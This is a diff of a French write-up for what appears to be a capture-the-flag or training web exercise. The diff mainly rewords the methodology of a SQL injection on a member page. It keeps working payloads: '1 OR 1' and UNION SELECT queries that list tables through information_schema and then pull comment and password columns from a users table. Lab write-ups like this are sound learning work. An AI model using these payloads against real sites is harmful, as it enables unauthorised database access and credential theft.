@@ -2,12 +2,14 @@
 /index.php?page=member
 
 ## Méthodologie
-Si on fait 1 OR 1 on remarque que les donnees de la table s'affiche
+Si l'on effectue 1 OR 1, on remarque que les données de la table s'affichent :
 ![members-page](assets/members-page.png)
 
-Ducoup on pousse avec des commandes SQL et l'aide d'information_schema pour voir toutes les tables et leurs columns: "1 UNION SELECT table_name, column_name FROM information_schema.columns"
+On en profite alors pour pousser plus loin en utilisant des commandes SQL et information_schema afin d'afficher toutes les tables et leurs colonnes :
 
-Puis on va chercher ddans la table qui nous interesse "users"
+1 UNION SELECT table_name, column_name FROM information_schema.columns
+
+Ensuite, on recherche les données dans la table qui nous intéresse, à savoir "users" 
 
 1 UNION SELECT Commentaire, countersign FROM users
 ![flag-to-decrypt](assets/flagToDecrypt.png)
